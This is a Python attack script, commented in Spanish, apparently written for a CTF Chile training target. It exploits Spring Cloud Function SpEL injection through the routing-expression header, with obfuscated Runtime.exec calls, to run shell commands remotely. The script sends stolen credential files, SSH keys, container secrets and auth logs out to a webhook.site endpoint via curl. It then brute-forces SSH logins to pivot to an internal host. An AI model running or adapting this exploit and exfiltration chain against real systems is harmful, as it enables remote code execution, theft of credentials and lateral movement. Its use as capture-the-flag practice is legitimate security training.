#!/usr/bin/env python3
"""
CTF Chile - Extracción específica de credenciales para pivoting
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Extrayendo credenciales específicas...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] EXTRAYENDO archivos de credenciales encontrados...")

# Examinar archivos de passwords específicos
probe("debconf_passwords", "cat /var/cache/debconf/passwords.dat")
probe("pam_password", "cat /var/lib/pam/password")

print("[*] BUSCANDO archivos de configuración SSH...")

# Buscar configuraciones SSH específicas
probe("ssh_known_hosts", "cat /etc/ssh/ssh_known_hosts /root/.ssh/known_hosts 2>/dev/null")
probe("ssh_client_config", "cat /etc/ssh/ssh_config | grep -v '^#' | grep -v '^$'")

print("[*] EXAMINANDO JAR de la aplicación para credenciales...")

# Extraer y examinar el JAR más sistemáticamente
probe("jar_extract_creds", "cd /tmp && rm -rf jar_creds && mkdir jar_creds && cd jar_creds && unzip -q /app/app.jar && find . -type f \\( -name '*.properties' -o -name '*.yml' -o -name '*.yaml' -o -name '*.conf' \\) | xargs cat")

print("[*] BUSCANDO claves SSH específicas...")

# Buscar claves SSH en el sistema
probe("ssh_keys_system", "find / -name 'id_rsa*' -o -name 'id_dsa*' -o -name 'id_ecdsa*' -o -name 'id_ed25519*' 2>/dev/null | head -10")

print("[*] EXPLORANDO configuración de Docker/contenedores...")

# Buscar información de contenedores que podría tener credenciales
probe("docker_secrets", "find /run/secrets /var/run/secrets 2>/dev/null | head -10")
probe("container_env", "cat /proc/1/environ | tr '\\0' '\\n' | grep -i -E 'pass|key|secret|token|cred'")

print("[*] PROBANDO credenciales comunes basadas en el contexto...")

# Intentar credenciales específicas del contexto bancario
bank_creds = [
    ("admin", "omnivault"),
    ("root", "omnivault"),
    ("vault", "vault"),
    ("admin", "banco"),
    ("ubuntu", "ubuntu"),
    ("user", "omnivault"),
    ("omnivault", "password"),
    ("admin", "admin123"),
    ("root", "root123")
]

for user, password in bank_creds[:5]:  # Primeras 5
    probe(f"ssh_cred_{user}_{password}", f"timeout 8 sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@10.160.209.1 'echo SSH_SUCCESS_{user} && whoami && hostname && pwd' 2>/dev/null || echo 'SSH_FAILED_{user}:{password}'")

print("[*] BUSCANDO logs de autenticación...")

# Revisar logs que podrían mostrar credenciales
probe("auth_logs", "cat /var/log/auth.log 2>/dev/null | tail -20")
probe("syslog_auth", "grep -i ssh /var/log/syslog 2>/dev/null | tail -10")

print("[*] VERIFICANDO archivos de configuración de Spring Boot...")

# Examinar configuraciones específicas de Spring
probe("spring_profiles", "cd /tmp/jar_creds 2>/dev/null && find . -name 'application*' | xargs cat | grep -v '^#' | grep -v '^$'")

time.sleep(15)

# Recoger y analizar respuestas
print("\n[*] Analizando credenciales extraídas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=30", timeout=10)
data = r.json().get("data", [])

ssh_successes = []
credentials = []
config_data = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar SSH exitoso
            if "SSH_SUCCESS" in decoded:
                ssh_successes.append((path, decoded))
                print(f"\n🎉 SSH EXITOSO EN {path}! 🎉")
                print(f"CONTENIDO: {decoded}")

            # Buscar credenciales útiles
            if any(keyword in decoded.lower() for keyword in ["password", "secret", "key", "token", "user"]):
                if "=" in decoded or ":" in decoded:
                    credentials.append((path, decoded))
                    print(f"🔑 CREDENCIAL DETECTADA")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO EN {path}! 🚩🚩🚩")
                print(f"FLAG: {decoded}")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen
print("\n" + "="*60)
print("📋 RESUMEN DE EXTRACCIÓN DE CREDENCIALES")
print("="*60)

if ssh_successes:
    print(f"🎉 SSH EXITOSO: {len(ssh_successes)} conexiones")
    for path, content in ssh_successes:
        print(f"    ✓ {path}: {content[:100]}...")
    print("\n🚀 ¡PIVOTING EXITOSO! Continuar con exploración del segundo host.")

elif credentials:
    print(f"🔑 CREDENCIALES ENCONTRADAS: {len(credentials)}")
    for path, content in credentials:
        print(f"    - {path}: {content[:80]}...")
    print("\n💡 Probar estas credenciales manualmente para SSH.")

else:
    print("💭 No se encontraron credenciales exitosas aún.")
    print("🔍 Revisar webhook manualmente para datos perdidos.")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")